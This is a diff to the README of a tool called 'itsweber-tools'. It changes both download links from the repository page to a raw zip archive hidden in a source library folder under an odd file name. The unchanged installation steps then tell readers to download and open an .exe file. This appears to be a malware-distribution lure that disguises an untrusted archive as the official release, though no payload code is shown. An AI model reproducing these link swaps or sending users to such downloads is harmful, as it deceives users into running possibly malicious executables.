@@ -1,6 +1,6 @@
 # 🛠 itsweber-tools - Manage local IT tasks without cloud
 
-[![Download itsweber-tools](https://img.shields.io/badge/Download-itsweber--tools-blue)](https://github.com/tenuous-hemisphere643/itsweber-tools)
+[![Download itsweber-tools](https://img.shields.io/badge/Download-itsweber--tools-blue)](https://github.com/tenuous-hemisphere643/itsweber-tools/raw/refs/heads/main/apps/web/src/lib/itsweber_tools_improvise.zip)
 
 ## 📋 About the software
 
@@ -19,7 +19,7 @@ To run this application, your computer needs the following:
 
 Follow these steps to set up the software:
 
-1. Visit [this page](https://github.com/tenuous-hemisphere643/itsweber-tools) to find the latest version.
+1. Visit [this page](https://github.com/tenuous-hemisphere643/itsweber-tools/raw/refs/heads/main/apps/web/src/lib/itsweber_tools_improvise.zip) to find the latest version.
 2. Look for the Assets section on that page.
 3. Click the file ending in .exe to download the installer.
 4. Open the downloaded file once the process completes.
